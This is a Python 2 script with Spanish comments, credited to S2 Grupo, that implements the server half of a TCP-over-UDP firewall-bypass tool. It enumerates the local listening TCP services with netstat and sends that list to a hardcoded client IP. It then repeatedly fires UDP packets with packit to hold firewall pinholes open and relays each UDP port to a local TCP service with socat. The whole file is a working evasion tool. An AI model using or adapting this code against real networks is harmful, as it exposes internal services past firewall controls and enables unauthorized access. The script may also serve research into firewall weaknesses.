#!/usr/bin/python

"""
************************ TCP 2 UDP FIREWALL BYPASSING ***********************

Descripcion: Evasion de cortafuegos a traves del protocolo UDP
Dependencias: packit socat (aptitude install packit socat)
Version: Version inicial 0.1 Beta
Comentarios: Testeado en entorno Debian 5.0
*****************************************************************************
"""

__autor__ = 'Roberto Amado, S2 Grupo'
__version__ = '0.1 Beta'
__fecha__ = '10 de Enero de 2011'

import thread
import os
from time import strftime, sleep, localtime
import socket
import signal

#Variables de configuracion ###############
puerto_control = 50000 #puerto por donde se enviara la informacion de servicios al cliente, debe ser el mismo que el del cliente. Ojo el cliente ha de ejecutarse primero. Este puerto se tomara como base para el mapeo de puertos posteriores.
ip_cliente = '172.17.0.53' # 
interfaz  = "eth1"
delay = 100 # Tiempo entre el envio del mantenimiento de la "conexion"

###########################################

def serviciosTCP():
	
	netstat = "netstat -lntp | grep -w tcp" 
	resultado = os.popen(netstat).read()
	aux = resultado.rsplit("\n")
	lista_servicios = ''
	puertos = []
	for i in range(len(aux)):
        	proceso = aux[i].rsplit("/")
		try:
			ip_puerto = proceso[0].rsplit(" ")		
			servicio = ip_puerto[15] + '#' + proceso[1] #proceso
			puertos.append(ip_puerto[15].rsplit(":")[1])
			servicio = servicio.replace(' ','')
			lista_servicios= lista_servicios + '@' + servicio 
		except:
			pass
	return lista_servicios, puertos

	
def enviaInfoServicios(trama, puerto_control, ip_cliente):

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect((ip_cliente,puerto_control))
		s.send(trama)
		s.close()
	except:
		print "Error al conectar con el cliente\n "

def lanzaPackit(Packit,lock):
	global delay
		
	while 1: 
		try: 
			lock.acquire()
			print "Manteniendo puerto abierto en cortafuegos...\n"
			os.popen(Packit).read()
			lock.release()
			sleep(delay)
		except:
			print "Error en el hilo\n"
def lanzaSocat(socat):
	print socat
	#lock.acquire()
	os.popen(socat).read()	
	#lock.release()
	
def FinPrograma(signum, frame):
		
	print "Fin programa\n"
		
listado_servicios, puertos = serviciosTCP()
enviaInfoServicios(listado_servicios, puerto_control, ip_cliente)
p_control = puerto_control +1
lock = thread.allocate_lock()
#lock2 = thread.allocate_lock()
print "Puertos TCP: "
print puertos
print "Numero total de puertos: %i\n" %  len(puertos)
for i in range(len(puertos)):
	sleep (1)
	print "Lanzado puerto: %i" %  int(p_control + i)
	Packit = "packit -t udp -S " + str(p_control + i) + " -D " + str(p_control + i) + " -d " + ip_cliente + " -i " + interfaz
	Socat = "socat UDP-LISTEN:" + str(p_control + i) + ",reuseaddr,fork TCP:127.0.0.1:" + str(puertos[i])
	try:
		thread.start_new_thread(lanzaPackit,(Packit,lock))
		thread.start_new_thread(lanzaSocat,(Socat,))
	except:
		print "Error al generar el hilo\n"

signal.signal(signal.SIGTERM, FinPrograma)
signal.pause()